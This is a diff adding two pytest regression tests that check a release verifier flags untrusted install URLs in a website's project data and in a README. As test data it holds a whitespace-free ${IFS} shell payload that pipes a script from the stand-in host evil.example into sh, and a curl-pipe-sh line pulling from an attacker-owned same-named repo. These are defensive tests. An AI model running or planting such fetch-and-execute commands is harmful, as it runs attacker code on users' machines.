@@ -7752,6 +7752,97 @@ def test_phase11_verify_readme_pin_ignores_unrelated_tool_url(
     assert "README pin" not in out
 
 
+def test_phase11_verify_website_sha_fails_for_ifs_glued_dual_url_payload(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A zero-whitespace ${IFS}-glued payload chaining a trusted
+    current-SHA curl invocation directly into an evil-host one — no
+    literal whitespace anywhere, since shell ${IFS} substitutes for a
+    space only at execution time, not in the source text — must still
+    classify the evil-host URL as untrusted.
+
+    Regression: a greedy candidate-extraction regex globs both URLs into
+    ONE candidate whose PATH starts with the trusted prefix (from the
+    first URL), so the merged blob was treated as "trusted but not
+    SHA-shaped" (a tolerated version-tag) and the appended
+    https://evil.example/... URL escaped has_untrusted entirely —
+    returning ([], False) instead of failing.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    ifs_payload = (
+        "curl${IFS}-fsSL${IFS}"
+        f"https://raw.githubusercontent.com/punt-labs/proj/{install_sha}/install.sh"
+        "${IFS}|${IFS}sh;curl${IFS}-fsSL${IFS}"
+        f"https://evil.example/punt-labs/proj/{install_sha}/install.sh"
+        "${IFS}|${IFS}sh"
+    )
+    projects = [
+        {
+            "id": "proj",
+            "version": version,
+            "githubUrl": "https://github.com/punt-labs/proj",
+            "installCommand": ifs_payload,
+        }
+    ]
+    _make_sibling(
+        tmp_path,
+        "public-website",
+        {"src/data/projects.json": json.dumps(projects, indent=2) + "\n"},
+    )
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ website SHA" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_readme_pin_fails_for_wrong_owner_right_repo(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A raw.githubusercontent.com URL for a DIFFERENT owner but the SAME
+    repo name fails the README check too.
+
+    Regression: the README check required /<owner>/<repo>/ together to
+    count as "references this project", so an attacker's own same-named
+    repo on the genuine raw.githubusercontent.com host — .../attacker-org
+    /proj/<sha>/install.sh — satisfied neither the trusted-prefix check
+    (owner mismatch) nor the reference check (needs both), and was
+    silently ignored, even though Check 8 (website, repo-name-only) would
+    have caught the identical URL.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        f"https://raw.githubusercontent.com/attacker-org/proj/{install_sha}"
+        "/install.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to attacker's same-named repo"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" in out
+    assert "trusted" in out
+
+
 # --- Phase 11: matches_install_sha() commit-identity resolution ---
 
 
